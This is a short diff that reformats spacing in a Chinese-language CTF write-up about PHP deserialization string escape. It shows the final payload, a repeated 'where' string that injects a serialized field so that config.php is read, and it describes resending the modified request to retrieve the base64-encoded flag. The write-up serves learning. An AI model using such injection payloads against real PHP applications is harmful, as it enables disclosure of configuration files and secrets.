@@ -58,14 +58,15 @@ s:8:"nickname";a:1:{i:0;s:204:"34*hacker";}s:5:"photo";s:10:"config.php";}
 
 由于字符数达到了限制，因此`config.php`成功被挤进了`photo`字段，反序列化成功结束。
 
-### 5. 最终Payload
+### 5. 最终 Payload
 
-构造完成的payload如下：
+构造完成的 payload 如下：
 
 ```
 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
 ```
-通过抓包，修改请求参数并重新发送。最终在响应中成功得到了base64编码的flag，解码之后便是题目的flag。
+
+通过抓包，修改请求参数并重新发送。最终在响应中成功得到了 base64 编码的 flag，解码之后便是题目的 flag。
 
 ![](2.png)
 
